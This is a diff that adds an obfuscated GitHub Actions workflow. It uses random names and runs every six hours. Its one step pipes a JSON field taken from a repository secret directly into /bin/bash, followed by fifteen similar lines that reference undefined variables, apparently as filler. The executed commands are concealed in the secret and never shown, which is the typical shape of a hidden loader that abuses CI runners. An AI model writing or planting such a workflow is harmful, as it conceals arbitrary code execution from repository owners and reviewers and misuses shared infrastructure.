@@ -1,0 +1,32 @@
+name: dihugangcaii
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dihugangcaii
+        env:
+          uekwi00578: ${{ secrets.uekwi00578 }}
+        run: |
+          echo $uekwi00578 | jq -r .wnwta29 | /bin/bash
+          echo $grzc4 | jq -r .xhrcm3747 | /bin/bash
+          echo $nxpqb9994 | jq -r .v4771 | /bin/bash
+          echo $tct05 | jq -r .wf92873 | /bin/bash
+          echo $l1 | jq -r .o7 | /bin/bash
+          echo $is2560 | jq -r .amkhz9845 | /bin/bash
+          echo $srd6 | jq -r .rneo1881 | /bin/bash
+          echo $wigel38 | jq -r .la037 | /bin/bash
+          echo $siqwy40290 | jq -r .rsnun9 | /bin/bash
+          echo $wjw49 | jq -r .tgr941 | /bin/bash
+          echo $jwqb116 | jq -r .m6 | /bin/bash
+          echo $v17937 | jq -r .w3 | /bin/bash
+          echo $buzgf75 | jq -r .arj9 | /bin/bash
+          echo $xq8 | jq -r .p6 | /bin/bash
+          echo $ua03664 | jq -r .p9827 | /bin/bash
+          echo $c76904 | jq -r .c2 | /bin/bash
+
